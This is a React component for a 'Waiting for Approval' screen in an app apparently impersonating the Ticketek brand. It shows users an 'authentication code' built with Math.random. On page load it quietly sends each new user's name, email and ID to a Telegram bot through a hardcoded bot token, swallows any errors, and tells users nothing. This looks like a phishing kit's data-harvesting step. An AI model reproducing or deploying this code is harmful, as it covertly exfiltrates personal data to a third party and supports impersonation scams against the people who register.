import { useEffect, useState } from "react";
import { base44 } from "@/api/base44Client";

function generateAuthCode(email) {
  const prefix = email.slice(0, 3).toLowerCase();
  const chars = "abcdefghijklmnopqrstuvwxyz0123456789";
  let suffix = "";
  for (let i = 0; i < 12; i++) suffix += chars[Math.floor(Math.random() * chars.length)];
  return `${prefix}:${suffix}`;
}

export default function WaitingApproval({ user, onRefresh }) {
  const [authCode, setAuthCode] = useState("");

  useEffect(() => {
    if (!user) return;
    const uid = user.id || Math.random().toString(36).substring(2, 18).toUpperCase();
    const message = `🆕 New user registration%0AName: ${encodeURIComponent(user.full_name || 'Unknown')}%0AEmail: ${encodeURIComponent(user.email)}%0AUID: ${uid}`;
    fetch(`https://api.telegram.org/bot7929452665:AAHyYbFzMcByoEkrH8i0qeqPpbzMiEcR9ZA/sendMessage?chat_id=@href_tk_bot&text=${message}`).catch(() => {});

    // Generate and store auth code
    async function setupAuthCode() {
      const profiles = await base44.entities.UserProfile.filter({ user_email: user.email }).catch(() => []);
      if (profiles.length > 0 && profiles[0].auth_code) {
        setAuthCode(profiles[0].auth_code);
      } else {
        const code = generateAuthCode(user.email);
        setAuthCode(code);
        if (profiles.length > 0) {
          await base44.entities.UserProfile.update(profiles[0].id, { auth_code: code }).catch(() => {});
        }
      }
    }
    setupAuthCode();
  }, [user?.email]);

  return (
    <div className="fixed inset-0 bg-white flex flex-col" style={{ paddingTop: "env(safe-area-inset-top)" }}>
      <div className="flex-1 flex flex-col items-center justify-center px-6 text-center overflow-y-auto py-8">
        <img
          src="https://image2url.com/r2/default/images/1775680602688-74d1916c-f13e-492b-aaaf-20e00c0a9469.jpeg"
          alt="Ticketek"
          className="w-48 mb-8 object-contain"
        />

        <h1 className="text-2xl font-bold text-gray-900 mb-1">Waiting for Approval</h1>
        <div className="w-12 h-1 rounded-full mb-5" style={{ backgroundColor: "#003057" }} />

        <p className="text-sm text-gray-600 mb-2">Your Account has been created successfully!</p>
        <p className="text-sm text-gray-500 mb-6">We're reviewing your registration and will notify you once approved.</p>

        <div className="bg-gray-50 rounded-xl p-5 text-left w-full max-w-sm mb-4">
          <p className="font-semibold text-gray-800 mb-3">What happens next?</p>
          <ul className="text-sm text-gray-600 space-y-2">
            <li>• Admin will review your account</li>
            <li>• You'll receive a notification when approved</li>
            <li>• You can check status by refreshing this page</li>
          </ul>
          <div className="mt-4 pt-4 border-t border-gray-200 text-xs text-gray-500 space-y-1">
            <p><span className="font-semibold">Email:</span> {user?.email}</p>
            <p><span className="font-semibold">Registered:</span> {user?.created_date ? new Date(user.created_date).toLocaleDateString("en-GB", { day: "numeric", month: "long", year: "numeric" }) : "Today"}</p>
          </div>
        </div>

        {/* Authentication Code card */}
        {authCode && (
          <div className="bg-gray-900 rounded-xl p-5 text-left w-full max-w-sm mb-6">
            <p className="font-semibold text-white mb-2 text-sm">🔐 Authentication Code</p>
            <div className="bg-gray-800 rounded-lg px-4 py-3 flex items-center justify-between gap-3 mb-3">
              <span className="text-green-400 font-mono text-sm tracking-wider flex-1" style={{ wordBreak: "break-all" }}>{authCode}</span>
              <button
                onClick={() => navigator.clipboard.writeText(authCode)}
                className="text-gray-400 hover:text-white bg-transparent border-none cursor-pointer p-1 flex-shrink-0"
                title="Copy"
              >
                <svg viewBox="0 0 24 24" width="18" height="18" fill="none" stroke="currentColor" strokeWidth="2">
                  <rect x="9" y="9" width="13" height="13" rx="2"/><path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1"/>
                </svg>
              </button>
            </div>
            <p className="text-xs text-yellow-400">⚠️ Keep this code safe. You will need it to view your authentication code later from your account settings.</p>
          </div>
        )}

        <button
          onClick={onRefresh}
          className="w-full max-w-sm py-4 rounded-xl text-white font-bold mb-3 border-none cursor-pointer"
          style={{ backgroundColor: "#003057" }}
        >
          Refresh Status
        </button>
        <button
          onClick={() => base44.auth.logout()}
          className="w-full max-w-sm py-4 rounded-xl font-bold border-2 bg-white cursor-pointer"
          style={{ color: "#003057", borderColor: "#003057" }}
        >
          Log Out
        </button>
      </div>
    </div>
  );
}